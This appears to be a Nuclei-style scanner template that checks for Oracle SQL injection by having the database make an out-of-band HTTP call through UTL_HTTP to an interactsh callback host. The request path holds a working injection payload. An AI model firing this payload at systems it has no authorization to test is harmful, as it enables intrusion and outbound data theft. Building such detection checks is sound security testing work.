http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}/?id=1; SELECT UTL_HTTP.REQUEST(''http://{{interactsh-url}}'') FROM
    DUAL--'
  stop-at-first-match: true
id: ai-oracle-http-utl
info:
  author: openai
  name: Oracle HTTP UTL OOB
  severity: high
  tags: oracle,oob,http
